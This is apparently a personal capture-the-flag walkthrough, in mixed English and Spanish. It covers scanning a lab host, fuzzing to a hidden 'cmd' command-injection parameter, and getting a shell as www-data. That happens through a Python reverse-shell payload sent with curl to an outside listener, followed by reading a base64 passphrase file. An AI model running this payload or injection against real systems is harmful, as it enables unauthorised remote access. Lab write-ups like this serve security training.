First i will do a nmap scan to target 

[davidoberst@archlinux ~]$ sudo nmap -Pn -sV -O 10.65.145.2

we have : 
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

i open the webpage 
http://10.65.184.34/ 
im gonna do fuzzing
[davidoberst@archlinux Web-Content]$ gobuster dir -u http://10.65.184.34/ -w common.txt

no other items founded 
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.64.132.198
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htpasswd            (Status: 403) [Size: 278]
.htaccess            (Status: 403) [Size: 278]
assets               (Status: 301) [Size: 315] [--> http://10.64.132.198/assets/]
server-status        (Status: 403) [Size: 278]
Progress: 20481 / 20481 (100.00%)
===============================================================
Finished
===============================================================
al entrar a assets sale una pagina en blanco,, as ique hare fuzzing a la pagina desde assets, y encontre index.php 

.hta                 (Status: 403) [Size: 278]
.htaccess            (Status: 403) [Size: 278]
.htpasswd            (Status: 403) [Size: 278]
images               (Status: 301) [Size: 322] [--> http://10.64.132.198/assets/images/]
index.php            (Status: 200) [Size: 0]

luego de encontrar index .php en la sigueinte url : 
http://10.64.132.198/assets/index.php muestra una pagina en blanco, asi que ahora intentare hacer un fuzzing de paraemtros : 
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:              http://10.64.132.198/assets/index.php?FUZZ=id
[+] Method:           GET
[+] Threads:          10
[+] Wordlist:         /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
[+] Exclude Length:   0
[+] User Agent:       gobuster/3.8.2
[+] Timeout:          10s
===============================================================
Starting gobuster in fuzzing mode
===============================================================
[Status=200] [Length=72] [Word=cmd] http://10.64.132.198/assets/index.php?cmd=id
Progress: 6453 / 6453 (100.00%)

al poner el parametero : 
http://10.64.132.198/assets/index.php?cmd=id
el servidor rsponde con un mensaje esn texto plano : 
dWlkPTMzKHd3dy1kYXRhKSBnaWQ9MzMod3d3LWRhdGEpIGdyb3Vwcz0zMyh3d3ctZGF0YSkK
es base64, al decodficiarlo muestra : 
uid=33(www-data) gid=33(www-data) groups=33(www-data)
note que al poner cualquier comando responde siempre con base 64, probe con ls y responde con : 
images
index.php
styles.css

intentare poner una reverse shell : 

listener : nc -lvnp 9999
payload : python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.138.111",9999));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'


recibi una respuestaen el listener : 

[davidoberst@archlinux ~]$ curl -g 'http://10.66.169.120/assets/index.php?cmd=python3%20-c%20%27import%20os%2Cpty%2Csocket%3Bs%3Dsocket.socket()%3Bs.connect((%22192.168.138.111%22%2C9999))%3B%5Bos.dup2(s.fileno()%2Cf)for%20f%20in(0%2C1%2C2)%5D%3Bpty.spawn(%22sh%22)%27'



[davidoberst@archlinux ~]$ nc -lvnp 9999
Listening on 0.0.0.0 9999
Connection received on 10.66.169.120 47292
$ ls
ls
images  index.php  styles.css
$ whoami 
whoami
www-data
$ 


encontre una carpeta llamada HIdden Content 

Hidden_Content  html
$ cd Hidden_COntent
cd Hidden_COntent
sh: 11: cd: can't cd to Hidden_COntent
$ cd Hidden_Content        
cd Hidden_Content
$ ls
ls
passphrase.txt
$ cat passphrase.txt
cat passphrase.txt
QWxsbWlnaHRGb3JFdmVyISEhCg==
$     

al decodificar el base64 dice :
AllmightForEver!!!

luego de buscar en los directorios, encontre la bandera, pero estaba bloqueada :

$ cd home
cd home
$ ls
ls
deku  ubuntu
$ cd deku
cd deku
$ ls
ls
user.txt
$ cat user.txt
cat user.txt
cat: user.txt: Permission denied


.bashrc
.logout
.profile

.local directory
oneforall
yuei
